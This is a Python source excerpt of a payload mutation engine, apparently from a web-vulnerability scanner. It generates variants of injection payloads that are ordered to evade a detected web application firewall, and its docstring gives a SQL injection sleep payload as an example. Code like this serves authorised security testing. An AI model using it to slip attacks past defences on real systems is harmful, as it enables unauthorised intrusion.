class PayloadMutator:
    """
    Core mutation engine. Takes a base payload and produces N variants
    using strategies appropriate for the vulnerability type and detected WAF.

    Usage:
        mutator = PayloadMutator()
        variants = mutator.mutate(
            payload="' AND SLEEP(5)-- -",
            vuln_type="sqli",
            waf_type=WAFVendor.MODSECURITY,
            max_variants=10,
        )
        for v in variants:
            print(v["strategy"], v["payload"])
    """

    def __init__(self, seed: Optional[int] = None):
        if seed is not None:
            random.seed(seed)

    def mutate(
        self,
        payload: str,
        vuln_type: str,
        waf_type: WAFVendor = WAFVendor.UNKNOWN,
        max_variants: int = 8,
        level: str = "aggressive",
    ) -> List[Dict[str, str]]:
        """
        Returns list of {"strategy": name, "payload": mutated_string}.
        The original payload is always included as the first element.
        """
        strategies = list(STRATEGY_MAP.get(vuln_type, UNIVERSAL_STRATEGIES))
        variants: List[Dict[str, str]] = [
            {"strategy": "original", "payload": payload}
        ]

        # Prioritize strategies known to work against the detected WAF
        priority_names = (
            WAF_STRATEGY_PRIORITY
            .get(waf_type, {})
            .get(vuln_type, [])
        )

        if priority_names and level == "aggressive":
            priority_strats = [s for s in strategies if s.name in priority_names]
            remaining = [s for s in strategies if s.name not in priority_names]
            ordered = priority_strats + remaining
        else:
            ordered = strategies
            random.shuffle(ordered)

        seen = {payload}

        # Single-strategy mutations
        for strat in ordered:
            if len(variants) >= max_variants:
                break
            try:
                mutated = strat.apply(payload)
                if mutated and mutated not in seen:
                    seen.add(mutated)
                    variants.append({"strategy": strat.name, "payload": mutated})
            except Exception:
                continue

        # Chained mutations (combine 2 strategies) for aggressive mode
        if level == "aggressive" and len(variants) < max_variants:
            for i, s1 in enumerate(ordered):
                if len(variants) >= max_variants:
                    break
                for s2 in ordered[i + 1:]:
                    if len(variants) >= max_variants:
                        break
                    try:
                        chained = s2.apply(s1.apply(payload))
                        if chained and chained not in seen:
                            seen.add(chained)
                            variants.append({
                                "strategy": f"{s1.name}+{s2.name}",
                                "payload": chained,
                            })
                    except Exception:
                        continue

        return variants[:max_variants]

    def mutate_batch(
        self,
        payloads: List[str],
        vuln_type: str,
        waf_type: WAFVendor = WAFVendor.UNKNOWN,
        variants_per_payload: int = 4,
    ) -> List[Dict[str, str]]:
        """Mutate multiple base payloads. Used to expand the entire payload
        library for a vulnerability detector in one call."""
        all_variants = []
        for p in payloads:
            all_variants.extend(
                self.mutate(p, vuln_type, waf_type, max_variants=variants_per_payload)
            )
        return all_variants


